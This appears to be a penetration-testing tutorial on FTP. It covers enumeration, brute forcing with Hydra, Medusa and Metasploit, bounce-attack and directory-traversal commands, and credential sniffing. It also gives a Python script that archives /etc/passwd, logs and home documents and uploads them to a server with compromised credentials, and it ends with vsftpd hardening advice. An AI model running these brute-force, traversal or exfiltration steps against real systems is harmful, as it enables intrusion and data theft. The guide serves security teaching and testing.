# Comprehensive Guide to FTP: Security, Enumeration, and Exploitation

## Introduction

File Transfer Protocol (FTP) is one of the oldest protocols still in use today, dating back to 1971. Despite its age and inherent security limitations, FTP remains prevalent across many networks and systems for file transfers. This article provides a comprehensive overview of FTP from a security perspective, including basic information, enumeration techniques, authentication methods, common attack vectors, and post-exploitation strategies.

## Basic Information

### What is FTP?

FTP is a standard network protocol used for transferring files between a client and server on a computer network. It operates on a client-server model using separate control and data connections between the client and server.

### Key Characteristics

- **Port Usage**: FTP typically uses port 21 for the control channel and port 20 for the data channel in active mode.
- **Connection Modes**:
  - **Active Mode**: The server initiates the data connection to the client.
  - **Passive Mode**: The client initiates the data connection to the server.
- **Authentication**: Traditionally uses cleartext username and password.
- **Data Transfer Modes**:
  - ASCII mode: For text files
  - Binary mode: For non-text files
- **Protocol Variants**:
  - **FTPS**: FTP over SSL/TLS
  - **SFTP**: Not FTP, but SSH File Transfer Protocol (completely different protocol)

### Common FTP Commands

| Command | Description |
|---------|-------------|
| USER    | Specify username |
| PASS    | Specify password |
| LIST    | List directory contents |
| CWD     | Change working directory |
| STOR    | Upload file |
| RETR    | Download file |
| QUIT    | End session |
| PASV    | Enter passive mode |
| PORT    | Specify active mode connection |

## FTP Enumeration

### Nmap Scanning

Nmap is the most commonly used tool for FTP enumeration. Here are some effective scanning techniques:

#### Basic Port Scan

```bash
# Scan for FTP service
nmap -p 21 192.168.1.0/24

# Scan for FTP on non-standard ports
nmap -p 1-65535 --open -T4 192.168.1.10 | grep ftp
```

#### Service Version Detection

```bash
# Identify FTP version
nmap -sV -p 21 192.168.1.10

# More aggressive version detection
nmap -sV --version-intensity 9 -p 21 192.168.1.10
```

#### FTP-specific NSE Scripts

```bash
# Run all FTP scripts
nmap --script=ftp-* -p 21 192.168.1.10

# Check for anonymous login
nmap --script=ftp-anon -p 21 192.168.1.10

# Check for vulnerabilities
nmap --script=ftp-vuln* -p 21 192.168.1.10

# Brute force FTP credentials
nmap --script=ftp-brute -p 21 192.168.1.10
```

### Banner Grabbing

Banner grabbing helps identify the FTP server version and configuration information.

#### Using Netcat

```bash
nc -v 192.168.1.10 21
```

#### Using Telnet

```bash
telnet 192.168.1.10 21
```

#### Using Python

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.10', 21))
banner = s.recv(1024)
print(banner.decode('utf-8'))
s.close()
```

#### Using Metasploit's FTP Auxiliary Modules

```
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.10
run
```

## Connecting to FTP Servers

### Command Line FTP Client

```bash
# Basic connection
ftp 192.168.1.10

# Specify username
ftp -u username 192.168.1.10

# Specify port
ftp -p 2121 192.168.1.10
```

### Anonymous Authentication

Anonymous authentication allows users to connect with username "anonymous" and often an email address as the password.

```bash
# Connect anonymously
ftp 192.168.1.10
Username: anonymous
Password: anonymous@example.com
```

### Using Python's ftplib

```python
from ftplib import FTP

# Connect to FTP server
ftp = FTP('192.168.1.10')
ftp.login('anonymous', 'anonymous@example.com')

# List directory contents
ftp.retrlines('LIST')

# Download a file
with open('downloaded_file.txt', 'wb') as f:
    ftp.retrbinary('RETR remote_file.txt', f.write)

# Upload a file
with open('local_file.txt', 'rb') as f:
    ftp.storbinary('STOR remote_file.txt', f)

# Close connection
ftp.quit()
```

## Attack Vectors

### Brute Force Attacks

FTP is susceptible to brute force attacks due to its simple authentication mechanism.

#### Using Hydra

```bash
# Basic brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# With specific username
hydra -l admin -P passwords.txt ftp://192.168.1.10

# Increased verbosity
hydra -V -l admin -P passwords.txt ftp://192.168.1.10
```

#### Using Medusa

```bash
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ftp
```

#### Using Metasploit

```
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.10
set USER_FILE users.txt
set PASS_FILE passwords.txt
set STOP_ON_SUCCESS true
run
```

### FTP Bounce Attack

The FTP bounce attack exploits the PORT command to scan or access systems behind a firewall.

#### Using Nmap

```bash
# Perform FTP bounce scan
nmap -b username:password@192.168.1.10 192.168.1.0/24
```

#### Manual Method

```bash
# Connect to FTP server
ftp 192.168.1.10
Username: username
Password: password

# Execute PORT command pointing to target
PORT 192,168,1,5,0,80
```

#### Python Implementation

```python
import socket

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.10', 21))

# Receive banner
print(s.recv(1024).decode('utf-8'))

# Send username and password
s.send(b'USER username\r\n')
print(s.recv(1024).decode('utf-8'))
s.send(b'PASS password\r\n')
print(s.recv(1024).decode('utf-8'))

# Use PORT command for bounce attack
# Format: PORT h1,h2,h3,h4,p1,p2 (IP = h1.h2.h3.h4, Port = p1*256+p2)
s.send(b'PORT 192,168,1,5,0,80\r\n')
print(s.recv(1024).decode('utf-8'))

# Issue LIST command to connect to target
s.send(b'LIST\r\n')
print(s.recv(1024).decode('utf-8'))

s.close()
```

### Directory Traversal

Some FTP servers are vulnerable to directory traversal attacks.

```bash
# Connect to FTP server
ftp 192.168.1.10
Username: anonymous
Password: anonymous@example.com

# Attempt directory traversal
cd ../..
cd /etc
get passwd
```

### Plaintext Credential Sniffing

Since FTP transmits credentials in plaintext, they can be captured using network sniffing tools.

```bash
# Using tcpdump
sudo tcpdump -i eth0 -nn -s0 -v port 21

# Using Wireshark filter
tcp port 21 or tcp port 20
```

## Post-Exploitation File Transfer

Once FTP access is gained, the server can be used for various file transfer operations.

### Using Command Line FTP

```bash
# Interactive file upload
ftp 192.168.1.10
Username: compromised_user
Password: compromised_password
put local_file.txt remote_file.txt
bye

# Non-interactive file upload
ftp -n 192.168.1.10 <<EOF
user compromised_user compromised_password
binary
put local_file.txt remote_file.txt
bye
EOF
```

### Using Python for Automated Transfers

```python
import ftplib
import os

def upload_directory(ftp, local_dir, remote_dir):
    """Upload a directory and its contents to an FTP server"""
    if not os.path.exists(local_dir):
        return
    
    # Create the remote directory if it doesn't exist
    try:
        ftp.mkd(remote_dir)
    except ftplib.error_perm:
        pass  # Directory might already exist
        
    ftp.cwd(remote_dir)
    
    # Upload files and process subdirectories
    for item in os.listdir(local_dir):
        local_path = os.path.join(local_dir, item)
        if os.path.isfile(local_path):
            with open(local_path, 'rb') as f:
                ftp.storbinary(f'STOR {item}', f)
        elif os.path.isdir(local_path):
            upload_directory(ftp, local_path, item)
    
    ftp.cwd('..')

# Connect to FTP server
ftp = ftplib.FTP('192.168.1.10')
ftp.login('compromised_user', 'compromised_password')

# Upload an entire directory
upload_directory(ftp, '/local/data', '/remote/data')

# Close connection
ftp.quit()
```

### Data Exfiltration

```python
import ftplib
import os
import tarfile
import tempfile

def exfiltrate_data(ftp, target_dirs, remote_dir):
    """Compress and exfiltrate data from target directories"""
    
    # Create a temporary archive
    with tempfile.NamedTemporaryFile(suffix='.tar.gz', delete=False) as temp_file:
        temp_path = temp_file.name
    
    # Compress target directories
    with tarfile.open(temp_path, 'w:gz') as tar:
        for directory in target_dirs:
            if os.path.exists(directory):
                tar.add(directory, arcname=os.path.basename(directory))
    
    # Upload to FTP server
    try:
        ftp.mkd(remote_dir)
    except ftplib.error_perm:
        pass  # Directory might already exist
    
    ftp.cwd(remote_dir)
    
    with open(temp_path, 'rb') as f:
        ftp.storbinary(f'STOR exfiltrated_data.tar.gz', f)
    
    # Clean up
    os.unlink(temp_path)

# Connect to FTP server
ftp = ftplib.FTP('192.168.1.10')
ftp.login('compromised_user', 'compromised_password')

# Exfiltrate sensitive directories
exfiltrate_data(ftp, ['/etc/passwd', '/var/log', '/home/user/documents'], '/exfil')

# Close connection
ftp.quit()
```

## Securing FTP

### Best Practices

1. **Use Secure Alternatives**: Replace FTP with SFTP or FTPS
2. **Implement Strong Authentication**: Use complex passwords and consider certificate-based authentication
3. **Restrict Access**: Implement IP-based access controls
4. **Configure Proper Permissions**: Limit directory access and file permissions
5. **Regular Audits**: Monitor FTP logs and perform regular security assessments
6. **Disable Anonymous Access**: Unless absolutely necessary
7. **Use Passive Mode**: Safer than active mode in most scenarios
8. **Network Segmentation**: Place FTP servers in appropriate network segments
9. **Data Encryption**: Use TLS/SSL for data in transit

### Configuring Secure vsftpd

```bash
# Edit vsftpd.conf
sudo nano /etc/vsftpd.conf

# Key security settings
anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=022
chroot_local_user=YES
ssl_enable=YES
allow_anon_ssl=NO
force_local_data_ssl=YES
force_local_logins_ssl=YES
ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO
require_ssl_reuse=NO
ssl_ciphers=HIGH
pasv_enable=YES
pasv_min_port=40000
pasv_max_port=40100
userlist_enable=YES
userlist_deny=YES
```

## Conclusion

FTP, despite its age and security limitations, remains a common protocol in many environments. Understanding its functionality, security implications, and potential vulnerabilities is crucial for both defenders and security professionals. While modern alternatives like SFTP and FTPS provide more secure options, knowing how to properly enumerate, exploit, and secure traditional FTP services is an essential skill in the cybersecurity toolkit.

For any production environment, it's strongly recommended to migrate away from plain FTP to more secure alternatives that protect both credentials and data in transit. If FTP must be used, implement as many security controls as possible to mitigate its inherent risks.
